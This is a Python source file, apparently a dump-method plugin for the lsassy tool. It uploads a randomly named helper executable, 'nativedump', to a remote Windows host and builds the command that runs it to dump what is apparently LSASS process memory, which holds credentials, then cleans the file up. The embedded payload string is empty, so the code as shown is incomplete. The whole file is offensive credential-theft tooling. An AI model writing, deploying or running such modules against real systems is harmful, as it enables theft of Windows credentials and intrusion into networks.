import base64
import random
import string
import zlib

from lsassy.dumpmethod import Dependency, IDumpMethod


class DumpMethod(IDumpMethod):
    def __init__(self, session, timeout, time_between_commands):
        super().__init__(session, timeout, time_between_commands)
        self.nativedump = Dependency(
        	"nativedump",
        	"".join(
                random.choice(string.ascii_letters + string.digits) for _ in range(8)
            )
            + ".exe")

        self.nativedump.content = zlib.decompress(
        	base64.b64decode(
        	''
        	)
		)

    def prepare(self, options):
        return self.prepare_dependencies(options, [self.nativedump,])

    def clean(self):
    	self.clean_dependencies([self.nativedump,])

    def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
        cmd_command = """{} {}{}""".format(
            self.nativedump.get_remote_path(),
            self.dump_path,
            self.dump_name
        )

        pwsh_command = cmd_command
        return {"cmd": cmd_command, "pwsh": pwsh_command}
